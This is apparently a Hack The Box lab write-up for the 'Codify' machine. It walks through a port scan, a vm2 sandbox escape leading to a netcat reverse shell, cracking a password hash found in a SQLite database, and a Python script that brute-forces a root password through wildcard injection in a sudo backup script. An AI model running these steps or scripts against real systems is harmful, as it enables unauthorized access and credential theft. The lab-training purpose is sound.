# HTB - Codify

### TL;DR
This is an Ubuntu 22.04 machine running a web application created with vulnerable version of vm2 library. Exploiting the vulnerability, we get inital foothold, and pivot to ssh user is gained through password hunting in the file system. Escalation is achieved exploiting vulnerability in local backup shell script, for this purpose we generate our own custom exploit.

**Keywords:**<br>
node.js, vm2, python exploit scripting

**References:**<br>
https://www.cvedetails.com/cve/CVE-2023-32314<br>
https://gist.github.com/arkark/e9f5cf5782dec8321095be3e52acf5ac<br>
https://www.baeldung.com/linux/bash-single-vs-double-brackets#4-pattern-matching
### PHASE 1. Service enumeration
Launch a port scan with `nmap`
```markdown
> nmap $target -p- -T4 -Pn --open --reason
nmap $target -p- -T4 -Pn --open --reason
Starting Nmap 7.93 ( https://nmap.org ) at 2023-11-05 06:35 EST
Nmap scan report for 10.129.156.20
Host is up, received user-set (0.065s latency).
Not shown: 64814 closed tcp ports (conn-refused), 718 filtered tcp ports (no-response)
Some closed ports may be reported as filtered due to --defeat-rst-ratelimit
PORT     STATE SERVICE REASON
22/tcp   open  ssh     syn-ack
80/tcp   open  http    syn-ack
3000/tcp open  ppp     syn-ack

Nmap done: 1 IP address (1 host up) scanned in 30.45 seconds
```
There are 2 web servers running. If you browse with firefox, you see they are made with vm2 library.

![codify2](https://github.com/g1vi/Hack-the-box-write-ups/assets/120142960/67d649f9-bbb7-4e24-80a6-430cbdecafa8)

For reverse shell, we'll focus on exploiting vm2 vulnerabilities.
### PHASE 2: User
Searching for vm2 vulnerabilities, we came across this cve-2023-32314 (https://www.cvedetails.com/cve/CVE-2023-32314)<br>
A poc can be found in github: https://gist.github.com/arkark/e9f5cf5782dec8321095be3e52acf5ac<br>
Running it in the application we have immediate code execution.

![codify1](https://github.com/g1vi/Hack-the-box-write-ups/assets/120142960/3106cd02-8828-48bb-9a51-9f36691a0b4d)

Which can be used to send a `mkfifo nc` reverse shell.

![codify3jpg](https://github.com/g1vi/Hack-the-box-write-ups/assets/120142960/b968c1f1-5f35-4ea5-8027-e55803658b2d)

Once inside the machine, first step is to inspect the `/etc/passwd` file, which reveals our first step would be to pivot to user joshua.
```markdown
> cat /etc/passwd | grep bash
root:x:0:0:root:/root:/bin/bash
joshua:x:1000:1000:,,,:/home/joshua:/bin/bash
svc:x:1001:1001:,,,:/home/svc:/bin/bash
```
Searching for interesting files in the file system, we came across this one `/var/www/contact/tickets.db`, which turns out to contain joshua's password hash.
```markdown
> cat /var/www/contact/tickets.db
�T5��T�format 3@  .WJ
       otableticketsticketsCREATE TABLE tickets (id INTEGER PRIMARY KEY AUTOINCREMENT, name TEXT, topic TEXT, description TEXT, status TEXT)P++Ytablesqlite_sequencesqlite_sequenceCREATE TABLE sqlite_sequence(name,seq)��     tableusersusersCREATE TABLE users (
        id INTEGER PRIMARY KEY AUTOINCREMENT, 
        username TEXT UNIQUE, 
        password TEXT
��G�joshua$2a$12$SOn8Pf6z8fO/nVsNbAAequ/P6vLRJJl7gCUEiYBU2iLHn4G/p/Zw2
��
����ua  users
             ickets
r]r�h%%�Joe WilliamsLocal setup?I use this site lot of the time. Is it possible to set this up locally? Like instead of coming to this site, can I download this and set it up in my own computer? A feature like that would be nice.open� ;�wTom HanksNeed networking modulesI think it would be better if you can implement a way to handle network-based stuff. Would help me out a lot. Thanks!open
```
This is a blowfish hash which can be cracked with `hashcat`.
```markdown
hashcat -m 3200 -a 0 -d 1 hash.txt .\rockyou.txt -r .\rockyou-30000.rule
```
ssh in as user joshua using found credentials and collect the flag.
### PHASE 3. System
Let's see if joshua is a sudoer.
```markdown
sudo -l
[sudo] password for joshua: 
Matching Defaults entries for joshua on codify:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin,
    use_pty

User joshua may run the following commands on codify:
    (root) /opt/scripts/mysql-backup.sh
```
It seems he can sudo run a backup script located at `/opt/scripts/mysql-backup.sh`. Inspect the code of the script which reveals to be vulnerable to wildcard injection.

![codify4](https://github.com/g1vi/Hack-the-box-write-ups/assets/120142960/5d9dc9ca-0f30-47fa-bcca-f403f554bed5)

Using double brackets in the `if` comparison allows us to use wildcards to guess the password, using a process similar to blind sql injections.
To find out more about the difference between single brackets and double brackets read this: https://www.baeldung.com/linux/bash-single-vs-double-brackets#4-pattern-matching
In summary, both conditions `[[$DB_PASS == Password123!]]` and `[[$DB_PASS == P* ]]` will be evaluated as true in the if statement.
To brute force the password you can use 3 methods:
1. Manually. Letter by letter, not recommended.
2. Semi-manually. Create a file called `letter` containing all lower-case, upper-case and digits and bruteforce them using a loop. As soon as you find a new character, add it to the for loop (e.g. `...echo abcde*...`) and repeat until no more letters are discovered. Add letters sequentially as you discover in each iteration. The first loop iteration would look like this:
```markdown
> for i in $(cat letters);do echo a* | sudo /opt/scripts/mysql-backup.sh && echo "$i";done
```
3. Using a python script. Elegant and fast. The machine also has perl installed. A proposed python script would be the following:
```python
import string
import os

chars = string.ascii_letters + string.digits
password=''
next=1

print("[+] initializing bruteforce script...")
print("[+] bruteforce in progress, please wait...")
while next==1:
        for i in chars:
                errorlevel=os.system("echo "+password+i+"* | sudo /opt/scripts/mysql-backup.sh >/dev/null 2>&1")
                if errorlevel==0:
                        password=password+i
                        print("[+] new character found: "+password)
                        next=1
                        break
                else: next=0
print("[+] process terminated, root password is: "+password)
```
Running it, the root mysql password is revealed in less than a minute, which turns out to be a reuse of the system's root password.

![codify5](https://github.com/g1vi/Hack-the-box-write-ups/assets/120142960/651f989c-f9e3-4ae8-83a3-a5f97dc017b1)

